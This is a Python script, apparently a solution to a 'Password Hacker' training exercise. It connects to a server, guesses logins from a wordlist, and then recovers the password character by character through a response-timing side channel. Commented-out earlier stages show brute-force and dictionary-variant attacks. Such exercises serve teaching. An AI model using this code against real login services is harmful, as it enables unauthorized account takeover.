# write your code here
import sys, socket, itertools, os, json
from datetime import datetime, timedelta

# stage 1
# def iterGen():
#     cases = list(itertools.chain(range(ord('a'), ord('z') + 1), range(ord('0'), ord('9') + 1)))
#     ans = [cases]
#     while 1:
#         yield ans
#         ans.append(cases)


def testAuth(soc, l, p=""):
    data = json.dumps({"login": l, "password": p})
    start = datetime.now()
    soc.send(data.encode())
    response = soc.recv(1024)
    diff = datetime.now() - start
    response = json.loads(response.decode()).get("result")
    return data, response, diff

# path = os.getcwd()
path = "D:\\Dropbox\\programming\\Home\\Password Hacker\\Password Hacker\\task\\hacking"

if __name__ == "__main__":
    hostname, port = sys.argv[1:]

    with socket.socket() as client_socket:
        address = (hostname, int(port))
        client_socket.connect(address)

        with open(path + '\\logins.txt', 'r') as db:
            logins = db.read().splitlines()

        difference = timedelta()
        for login in logins:
            data, resp, time = testAuth(client_socket, login)
            difference = max(difference, time)
            if resp != "Wrong login!":
                break

        response = {}
        psw = ""
        cases = [chr(i) for i in list(itertools.chain(
            *[range(ord(a[0]), ord(a[1]) + 1) for a in [('a', 'z'), ('A', 'Z'), ('0', '9')]])
        )]

        while response != "Connection success!":
            for i in cases:
                start = datetime.now()
                data, response, time = testAuth(client_socket, login, psw + i)
                if time > difference or response == "Connection success!":
                    psw += i
                    break

# stage 1
        # it = iterGen()
        # while response != "Connection success!":
        #     nit = next(it)
        #     for p in itertools.product(*nit):
        #         psw = bytes(p)
        #         client_socket.send(psw)
        #         response = client_socket.recv(1024).decode()
        #         if response == "Connection success!":
        #             break

# stage 2
        # with open(os.getcwd()+'\\passwords.txt', 'r') as db:
        #     base = db.read().splitlines()
        # for a in base:
        #     for p in itertools.product(*zip(a, a.upper())):
        #         psw = "".join(p)
        #         client_socket.send(psw.encode())
        #         response = client_socket.recv(1024).decode()
        #         if response == "Connection success!":
        #             break
        #     if response == "Connection success!":
        #         break
    print(data)

